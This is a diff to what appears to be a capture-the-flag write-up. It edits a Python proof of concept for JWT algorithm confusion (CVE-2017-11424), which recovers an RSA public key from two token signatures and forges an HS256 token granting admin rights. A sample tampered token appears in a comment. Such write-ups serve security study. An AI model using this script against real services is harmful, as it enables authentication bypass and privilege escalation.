@@ -52,6 +52,7 @@ print(jwt.encode({'username': 'user', 'admin': True}, PRIVATE_KEY, algorithm='HS
 
 ```python
 # modified script from https://github.com/silentsignal/rsa_sign2n/blob/release/CVE-2017-11424/x_CVE-2017-11424.py
+
 import sys
 import jwt
 import json
@@ -72,31 +73,22 @@ jwt1="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIyIiwiYWRtaW4iO
 
 def b64urldecode(b64):
     return base64.urlsafe_b64decode(b64+("="*(len(b64) % 4)))
-
 def b64urlencode(m):
     return base64.urlsafe_b64encode(m).strip(b"=")
-
 def bytes2mpz(b):
     return mpz(int(binascii.hexlify(b),16))
-
-
 def der2pem(der, token="RSA PUBLIC KEY"):
     der_b64=base64.b64encode(der).decode('ascii')
-    
     lines=[ der_b64[i:i+64] for i in range(0, len(der_b64), 64) ]
     return "-----BEGIN %s-----\n%s\n-----END %s-----\n" % (token, "\n".join(lines), token)
-
-
 def forge_mac(jwt0, public_key):
     jwt0_parts=jwt0.encode('utf8').split(b'.')
     jwt0_msg=b'.'.join(jwt0_parts[0:2])
-
     alg=b64urldecode(jwt0_parts[0].decode('utf8'))
     alg_tampered=b64urlencode(alg.replace(b"RS256",b"HS256"))
 
     # here i edit the payload as  {"username":"user1","admin":true}
-    edit = "eyJ1c2VybmFtZSI6InVzZXIxIiwiYWRtaW4iOnRydWV9"
-    payload=json.loads(b64urldecode(edit))
+    payload=json.loads( '{"username":"user1","admin":true}' )
 
     payload['exp'] = int(time.time())+86400
     payload_encoded=b64urlencode(json.dumps(payload).encode('utf8'))
@@ -106,29 +98,20 @@ def forge_mac(jwt0, public_key):
 
 jwt0_sig_bytes = b64urldecode(jwt0.split('.')[2])
 jwt1_sig_bytes = b64urldecode(jwt1.split('.')[2])
-if len(jwt0_sig_bytes) != len(jwt1_sig_bytes):
-    raise Exception("Signature length mismatch") # Based on the mod exp operation alone, there may be some differences!
-
 jwt0_sig = bytes2mpz(jwt0_sig_bytes)
 jwt1_sig = bytes2mpz(jwt1_sig_bytes)
-
 jks0_input = ".".join(jwt0.split('.')[0:2])
 sha256_0=SHA256.new(jks0_input.encode('ascii'))
 padded0 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(sha256_0, len(jwt0_sig_bytes))
-
 jks1_input = ".".join(jwt1.split('.')[0:2])
 sha256_1=SHA256.new(jks1_input.encode('ascii'))
 padded1 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(sha256_1, len(jwt0_sig_bytes))
-
 m0 = bytes2mpz(padded0) 
 m1 = bytes2mpz(padded1)
-
 pkcs1 = asn1tools.compile_files('pkcs1.asn', codec='der')
 x509 = asn1tools.compile_files('x509.asn', codec='der')
-
 for e in [mpz(3),mpz(65537)]:
     gcd_res = gcd(pow(jwt0_sig, e)-m0,pow(jwt1_sig, e)-m1)
-    
     for my_gcd in range(1,100):
         my_n=c_div(gcd_res, mpz(my_gcd))
         if pow(jwt0_sig, e, my_n) == m0:
@@ -145,6 +128,5 @@ for e in [mpz(3),mpz(65537)]:
                 pem_out.write(public_key)
                 forge_mac(jwt0, public_key)
     
-
-#payload: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJ1c2VyMSIsICJhZG1pbiI6IHRydWUsICJleHAiOiAxNjQwNTc0NTQ4fQ.zH0d1HL5tQpXFU_ZLt6Z4r5jn6ecNq5yf3mmLLXLfDs
+#tampered JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJ1c2VyMSIsICJhZG1pbiI6IHRydWUsICJleHAiOiAxNjQwNTc1MTI2fQ.eYTJvTz4tWny9dPZDtwPjCu92FLBoTxYiQP8YpgFtYI
 ```
